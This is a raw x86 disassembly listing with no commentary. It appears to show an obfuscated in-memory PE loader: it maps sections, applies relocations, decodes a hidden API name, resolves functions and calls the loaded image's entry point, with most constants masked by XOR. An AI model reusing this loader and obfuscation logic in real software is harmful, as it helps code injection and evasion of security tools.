  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
